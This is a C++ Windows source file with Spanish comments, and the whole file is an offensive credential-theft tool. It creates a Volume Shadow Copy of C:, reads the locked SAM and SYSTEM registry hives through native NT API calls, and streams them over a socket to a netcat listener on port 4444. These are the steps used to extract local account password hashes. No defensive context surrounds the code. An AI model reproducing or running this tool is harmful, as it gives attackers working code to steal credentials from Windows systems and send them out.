#define _WIN32_DCOM
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <comdef.h>
#include <iostream>
#include <stdio.h>

// *** IMPORTANTE: este orden de includes evita los errores del SDK moderno ***
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <vector>

// #include <winsock2.h>
// #include <ws2tcpip.h>

#define FILE_OPEN 0x00000001

#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ws2_32.lib")


struct FileHeader {
    char filename[32];      // Nombre del archivo
    uint32_t filesize;      // Tamaño en bytes (network byte order)
    uint32_t checksum;      // Optional: checksum para verificar
};


typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);

NtCreateFileFn NtCreateFile;
NtReadFileFn NtReadFile;
NtCloseFn NtClose;


bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
    // Preparar el header
    FileHeader header;
    memset(&header, 0, sizeof(header));

    // Copiar nombre del archivo (máximo 31 caracteres + null terminator)
    strncpy_s(header.filename, sizeof(header.filename), filename.c_str(), _TRUNCATE);
    header.filesize = htonl(static_cast<uint32_t>(filedata.size()));
    header.checksum = htonl(0); // Podrías calcular un checksum aquí

    // 1. Enviar header
    int bytes_sent = send(sock, reinterpret_cast<const char*>(&header), sizeof(header), 0);
    if (bytes_sent != sizeof(header)) {
        printf("Error enviando header para %s\n", filename.c_str());
        return false;
    }

    // 2. Enviar datos del archivo
    bytes_sent = send(sock, reinterpret_cast<const char*>(filedata.data()),
        static_cast<int>(filedata.size()), 0);
    if (bytes_sent != filedata.size()) {
        printf("Error enviando datos para %s\n", filename.c_str());
        return false;
    }

    printf("%s enviado (%zu bytes)\n", filename.c_str(), filedata.size());
    return true;
}


bool send_files_to_netcat(const std::vector<BYTE>& sam_data,
    const std::vector<BYTE>& system_data,
    const char* host, int port) {
    // Inicializar Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error inicializando Winsock\n");
        return false;
    }

    // Crear socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Error creando socket\n");
        WSACleanup();
        return false;
    }

    // Configurar dirección del servidor
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, host, &serverAddr.sin_addr);

    // Conectar
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Error conectando a %s:%d\n", host, port);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    printf("Conectado a %s:%d\n", host, port);

    // Enviar archivos
    bool success = true;
    success &= send_file_over_socket(sock, "sam", sam_data);
    success &= send_file_over_socket(sock, "system", system_data);

    // Cerrar conexión
    closesocket(sock);
    WSACleanup();

    return success;
}


std::wstring GuidToWString(GUID id) {
    wchar_t buf[64];
    StringFromGUID2(id, buf, 64);
    return std::wstring(buf);
}


void PrintHR(const char* label, HRESULT hr) {
    std::cout << label << " -> 0x" << std::hex << hr << std::dec;
    if (FAILED(hr)) std::cout << " [FAILED]";
    std::cout << std::endl;
}


int list_shadows() {
    std::cout << "=== DEPURACION VSS ENUM ===\n";

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    PrintHR("CoInitializeEx", hr);
    if (FAILED(hr)) return 1;

    IVssBackupComponents* pBackup = nullptr;
    hr = CreateVssBackupComponents(&pBackup);
    PrintHR("CreateVssBackupComponents", hr);
    if (FAILED(hr) || !pBackup) {
        CoUninitialize();
        return 1;
    }

    hr = pBackup->InitializeForBackup();
    PrintHR("InitializeForBackup", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return 1;
    }

    // *** CAMBIO CLAVE: Establecer el contexto para ver todas las shadow copies ***
    hr = pBackup->SetContext(VSS_CTX_ALL);
    PrintHR("SetContext", hr);
    if (FAILED(hr)) {
        // Si falla, intentar con un contexto más específico
        hr = pBackup->SetContext(VSS_CTX_BACKUP);
        PrintHR("SetContext (BACKUP fallback)", hr);
    }

    IVssEnumObject* pEnum = nullptr;
    hr = pBackup->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pEnum);
    PrintHR("IVssBackupComponents::Query", hr);
    if (FAILED(hr) || !pEnum) {
        pBackup->Release();
        CoUninitialize();
        return 1;
    }

    std::cout << "\nEnumerando instantaneas...\n";

    VSS_OBJECT_PROP prop = {};
    ULONG fetched = 0;
    bool any = false;

    while (true) {
        hr = pEnum->Next(1, &prop, &fetched);
        if (hr == S_FALSE || fetched == 0) break;
        if (FAILED(hr)) {
            PrintHR("IVssEnumObject::Next", hr);
            break;
        }

        if (prop.Type == VSS_OBJECT_SNAPSHOT) {
            any = true;
            VSS_SNAPSHOT_PROP& snap = prop.Obj.Snap;

            std::wcout << L"\nShadow ID:       " << GuidToWString(snap.m_SnapshotId);
            std::wcout << L"\nSet ID:          " << GuidToWString(snap.m_SnapshotSetId);
            std::wcout << L"\nOriginal Volume: " << (snap.m_pwszOriginalVolumeName ? snap.m_pwszOriginalVolumeName : L"(null)");
            std::wcout << L"\nDevice Object:   " << (snap.m_pwszSnapshotDeviceObject ? snap.m_pwszSnapshotDeviceObject : L"(null)");
            std::wcout << L"\nOriginating Machine: " << (snap.m_pwszOriginatingMachine ? snap.m_pwszOriginatingMachine : L"(null)");
            std::wcout << L"\nService Machine:     " << (snap.m_pwszServiceMachine ? snap.m_pwszServiceMachine : L"(null)");

            // Mostrar atributos en formato legible
            std::wcout << L"\nAttributes:          0x" << std::hex << snap.m_lSnapshotAttributes << std::dec;
            if (snap.m_lSnapshotAttributes & VSS_VOLSNAP_ATTR_PERSISTENT)
                std::wcout << L" (Persistent)";
            if (snap.m_lSnapshotAttributes & VSS_VOLSNAP_ATTR_CLIENT_ACCESSIBLE)
                std::wcout << L" (Client-accessible)";
            std::wcout << L"\n";

            VssFreeSnapshotProperties(&snap);
        }
    }

    if (!any)
        std::cout << "\nNo se encontraron instantaneas.\n";

    pEnum->Release();
    pBackup->Release();
    CoUninitialize();

    std::cout << "\n=== Fin del programa ===" << std::endl;
    return 0;
}


HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObject) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    PrintHR("CoInitializeEx", hr);

    if (SUCCEEDED(hr)) {
        IVssBackupComponents* pBackup = nullptr;
        hr = CreateVssBackupComponents(&pBackup);
        PrintHR("CreateVssBackupComponents", hr);

        if (SUCCEEDED(hr) && pBackup) {
            hr = pBackup->InitializeForBackup();
            PrintHR("InitializeForBackup", hr);
            pBackup->Release();
        }
        CoUninitialize();
    }

    std::wcout << L"\n=== CREANDO SHADOW COPY PARA: " << volumePath << L" ===\n";

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    PrintHR("CoInitializeEx", hr);
    if (FAILED(hr)) return hr;

    IVssBackupComponents* pBackup = nullptr;
    hr = CreateVssBackupComponents(&pBackup);
    PrintHR("CreateVssBackupComponents", hr);
    if (FAILED(hr) || !pBackup) {
        CoUninitialize();
        return hr;
    }

    hr = pBackup->InitializeForBackup();
    PrintHR("InitializeForBackup", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    // Verificar si el volumen soporta VSS
    BOOL bSupported = FALSE;
    hr = pBackup->IsVolumeSupported(GUID_NULL, (WCHAR*)volumePath.c_str(), &bSupported);
    PrintHR("IsVolumeSupported", hr);
    if (SUCCEEDED(hr)) {
        std::cout << "Volumen soporta VSS: " << (bSupported ? "SI" : "NO") << std::endl;
        if (!bSupported) {
            std::cout << "ERROR: El volumen no soporta VSS" << std::endl;
            pBackup->Release();
            CoUninitialize();
            return VSS_E_VOLUME_NOT_SUPPORTED;
        }
    }

    // Establecer contexto para shadow copy persistente
    hr = pBackup->SetContext(VSS_CTX_BACKUP);
    PrintHR("SetContext", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    // Configurar el backup
    hr = pBackup->SetBackupState(false, false, VSS_BT_FULL, false);
    PrintHR("SetBackupState", hr);

    // Obtener la interfaz de administración de escritores
    std::cout << "Llamando a GatherWriterMetadata..." << std::endl;
    IVssAsync* pAsyncMetadata = nullptr;
    hr = pBackup->GatherWriterMetadata(&pAsyncMetadata);
    PrintHR("GatherWriterMetadata", hr);

    if (SUCCEEDED(hr) && pAsyncMetadata) {
        std::cout << "Esperando a que GatherWriterMetadata complete..." << std::endl;
        hr = pAsyncMetadata->Wait();
        PrintHR("GatherWriterMetadata Wait", hr);

        // Obtener estado de finalización
        HRESULT hrMetadataStatus;
        hr = pAsyncMetadata->QueryStatus(&hrMetadataStatus, NULL);
        PrintHR("GatherWriterMetadata QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            std::cout << "Estado de GatherWriterMetadata: 0x" << std::hex << hrMetadataStatus << std::dec << std::endl;
        }
        pAsyncMetadata->Release();
    }

    if (FAILED(hr)) {
        std::cout << "Fallo en GatherWriterMetadata, intentando continuar de todas formas..." << std::endl;
        hr = S_OK; // Reset para continuar
    }

    // Crear el conjunto de shadow copies
    VSS_ID snapshotSetId;
    hr = pBackup->StartSnapshotSet(&snapshotSetId);
    PrintHR("StartSnapshotSet", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    std::wcout << L"SnapshotSet ID: " << GuidToWString(snapshotSetId) << std::endl;

    // Agregar el volumen al conjunto
    VSS_ID snapshotId;
    hr = pBackup->AddToSnapshotSet((WCHAR*)volumePath.c_str(), GUID_NULL, &snapshotId);
    PrintHR("AddToSnapshotSet", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    std::wcout << L"Snapshot ID: " << GuidToWString(snapshotId) << std::endl;

    // Preparar los escritores para el backup
    std::cout << "Llamando a PrepareForBackup..." << std::endl;
    IVssAsync* pAsyncPrepare = nullptr;
    hr = pBackup->PrepareForBackup(&pAsyncPrepare);
    PrintHR("PrepareForBackup", hr);

    if (SUCCEEDED(hr) && pAsyncPrepare) {
        std::cout << "Esperando a que PrepareForBackup complete..." << std::endl;
        hr = pAsyncPrepare->Wait();
        PrintHR("PrepareForBackup Wait", hr);

        HRESULT hrPrepareStatus;
        hr = pAsyncPrepare->QueryStatus(&hrPrepareStatus, NULL);
        PrintHR("PrepareForBackup QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            std::cout << "Estado de PrepareForBackup: 0x" << std::hex << hrPrepareStatus << std::dec << std::endl;
        }
        pAsyncPrepare->Release();
    }

    if (FAILED(hr)) {
        std::cout << "Fallo en PrepareForBackup, intentando continuar de todas formas..." << std::endl;
        hr = S_OK; // Reset para continuar
    }

    // Crear el shadow copy
    std::cout << "Llamando a DoSnapshotSet..." << std::endl;
    IVssAsync* pAsyncSnapshot = nullptr;
    hr = pBackup->DoSnapshotSet(&pAsyncSnapshot);
    PrintHR("DoSnapshotSet", hr);

    if (SUCCEEDED(hr) && pAsyncSnapshot) {
        std::cout << "Esperando a que DoSnapshotSet complete..." << std::endl;
        hr = pAsyncSnapshot->Wait();
        PrintHR("DoSnapshotSet Wait", hr);

        HRESULT hrSnapshotStatus;
        hr = pAsyncSnapshot->QueryStatus(&hrSnapshotStatus, NULL);
        PrintHR("DoSnapshotSet QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            std::cout << "Estado de DoSnapshotSet: 0x" << std::hex << hrSnapshotStatus << std::dec << std::endl;
        }
        pAsyncSnapshot->Release();
    }

    if (SUCCEEDED(hr)) {
        // Obtener las propiedades del shadow copy creado
        VSS_SNAPSHOT_PROP snapProp;
        hr = pBackup->GetSnapshotProperties(snapshotId, &snapProp);
        if (SUCCEEDED(hr)) {
            std::wcout << L"\n=== SHADOW COPY CREADO EXITOSAMENTE ===\n";
            std::wcout << L"Shadow ID:       " << GuidToWString(snapProp.m_SnapshotId);
            std::wcout << L"\nSet ID:          " << GuidToWString(snapProp.m_SnapshotSetId);
            std::wcout << L"\nOriginal Volume: " << (snapProp.m_pwszOriginalVolumeName ? snapProp.m_pwszOriginalVolumeName : L"(null)");
            std::wcout << L"\nDevice Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)"); // <---- ESTOOOOOOOOO
            std::wcout << L"\nAttributes:      0x" << std::hex << snapProp.m_lSnapshotAttributes << std::dec;

            if (snapProp.m_pwszSnapshotDeviceObject) {
                outDeviceObject = snapProp.m_pwszSnapshotDeviceObject;
            }
            else {
                outDeviceObject = L"(null)";
            }

            VssFreeSnapshotProperties(&snapProp);
        }
        else {
            PrintHR("GetSnapshotProperties", hr);
        }
    }

    pBackup->Release();
    CoUninitialize();

    return hr;
}


void InitializeNTFunctions() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    NtCreateFile = (NtCreateFileFn)GetProcAddress(hNtdll, "NtCreateFile");
    NtReadFile = (NtReadFileFn)GetProcAddress(hNtdll, "NtReadFile");
    NtClose = (NtCloseFn)GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateFile || !NtReadFile || !NtClose) {
        printf("Error: No se pudieron cargar las funciones de ntdll.dll\n");
        exit(1);
    }
}


HANDLE OpenFileWithNT(const wchar_t* filePath) {
    UNICODE_STRING unicodeString;
    unicodeString.Buffer = (PWSTR)filePath;
    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
    unicodeString.MaximumLength = unicodeString.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.ObjectName = &unicodeString;
    objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE fileHandle = NULL;

    NTSTATUS status = NtCreateFile(
        &fileHandle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        0,
        FILE_SHARE_READ,
        FILE_OPEN,
        0,
        NULL,
        0
    );

    if (status != 0) {
        printf("Error al abrir archivo. Código NT: 0x%08X\n", status);
        return NULL;
    }

    return fileHandle;
}


std::vector<BYTE> ReadFileBytes(HANDLE fileHandle) {
    std::vector<BYTE> fileContent;
    BYTE buffer[4096];
    IO_STATUS_BLOCK ioStatusBlock;
    LARGE_INTEGER byteOffset = { 0 };

    while (TRUE) {
        NTSTATUS status = NtReadFile(
            fileHandle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            buffer,
            sizeof(buffer),
            &byteOffset,
            NULL
        );

        if (status != 0 && status != 0x00000103) {
            if (status == 0x80000006) { // STATUS_END_OF_FILE
                break;
            }
            printf("Error en lectura. Código NT: 0x%08X\n", status);
            break;
        }

        DWORD bytesRead = (DWORD)ioStatusBlock.Information;

        if (bytesRead == 0) {
            break;
        }

        // Agregar bytes al vector en lugar de imprimirlos
        fileContent.insert(fileContent.end(), buffer, buffer + bytesRead);

        // Actualizar offset para siguiente lectura
        byteOffset.QuadPart += bytesRead;
    }

    return fileContent;
}


std::vector<BYTE> read_file(const wchar_t* filePath) {
    std::vector<BYTE> fileContent;

    // Inicializar funciones NT
    InitializeNTFunctions();
    printf("Funciones NTAPI inicializadas correctamente.\n");

    printf("Intentando abrir: %ls\n", filePath);

    // Abrir archivo
    HANDLE fileHandle = OpenFileWithNT(filePath);
    if (!fileHandle) {
        printf("No se pudo abrir el archivo.\n");
        return fileContent;
    }
    printf("Archivo abierto correctamente. Handle: %p\n", fileHandle);

    fileContent = ReadFileBytes(fileHandle);
    printf("Read %zu bytes.\n", fileContent.size());

    NtClose(fileHandle);
    printf("Handle del archivo cerrado.\n");
    return fileContent;
}


int main() {
    std::wstring basePath;
    HRESULT hr = create_shadow(L"C:\\", basePath);

    if (!basePath.empty()) {
        std::wcout << L"\nExito: Shadow copy creado! Device Object: " << basePath << std::endl;
    }
    else {
        std::cout << "\nFallo: No se pudo crear shadow copy" << std::endl;
    }

    size_t pos = basePath.find(L"\\\\?\\");
    if (pos != std::wstring::npos) {
        basePath.replace(pos, 4, L"\\??\\");
    }

    std::wstring fullPathSam    = basePath + L"\\windows\\system32\\config\\sam";
    std::wstring fullPathSystem = basePath + L"\\windows\\system32\\config\\system"; // L"\\temp\\test1.txt";

    std::vector<BYTE> SamBytes      = read_file(fullPathSam.c_str());
    std::vector<BYTE> SystemBytes   = read_file(fullPathSystem.c_str());

    if (send_files_to_netcat(SamBytes, SystemBytes, "127.0.0.1", 4444)) {
        printf("Archivos enviados exitosamente\n");
    }
    else {
        printf("Error enviando archivos\n");
    }

    /*
    list_shadows();
    */

    return 0;
}